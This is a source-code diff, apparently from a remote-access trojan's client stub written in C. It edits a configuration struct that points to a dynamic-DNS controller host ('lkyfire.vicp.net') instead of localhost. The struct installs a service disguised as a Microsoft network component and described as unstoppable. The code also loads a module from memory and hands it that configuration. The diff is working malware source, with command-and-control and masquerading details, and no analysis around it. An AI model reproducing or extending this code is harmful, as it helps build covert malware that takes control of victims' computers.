@@ -11,13 +11,11 @@
 
 unsigned long _stdcall resolve(char *host)
 {
-	struct hostent *ser = NULL;
-
 	long i = inet_addr(host);
 
 	if (i == INADDR_NONE) //Not Ip
 	{
-		ser = (struct hostent*)gethostbyname(host);
+		struct hostent *ser = (struct hostent*)gethostbyname(host);
 
 		if (ser == NULL)
 		{
@@ -38,7 +36,7 @@ unsigned long _stdcall resolve(char *host)
 struct MODIFY_DATA
 {
 	char  strIPFile[128];   //ip文件or DNS						0
-	char  strVersion[16];   //服务端版本						128
+	char  strVersion[16];   //服务端版本							128
 	DWORD dwVipID;          //VIP ID							144
 	BOOL  bReplace;         //TRUE-替换服务，FALSE-新建服务		148
 	char  strSvrName[32];   //服务名称							149
@@ -49,13 +47,13 @@ struct MODIFY_DATA
 } modify_data =
 {
 	"lkyfire.vicp.net:80",
-	"20150914",
+	"20151020",
 	405,
 	FALSE,
 	"WinNetCenter",
 	"Microsoft(R) Multi Protocol Network Control Center",
 	"Provides supports for multi network Protocol. This service can not be stopped.",
-	"127.0.0.1",
+	"lkyfire.vicp.net",
 	80
 };
 
@@ -131,7 +129,7 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 
 		typedef BOOL(*_RoutineMain)(LPVOID lp);
 
-		_RoutineMain  RoutineMain = (_RoutineMain)MemoryGetProcAddress(hModule, "RoutineMain");
+		_RoutineMain RoutineMain = (_RoutineMain)MemoryGetProcAddress(hModule, "RoutineMain");
 		Err = RoutineMain((LPVOID)&modify_data);
 		MemoryFreeLibrary(hModule);
 	}
@@ -192,13 +190,13 @@ OK:
 		{
 			if (ConnectThread(NULL) == -1)
 			{
-				WSACleanup();
-				return 0;
+				MsgErr("exiting");
+				break;
 			}
 		}
 		__except (1)
 		{
-			MsgErr("Except");
+			MsgErr("ConnectThread Exception");
 		}
 	}
 
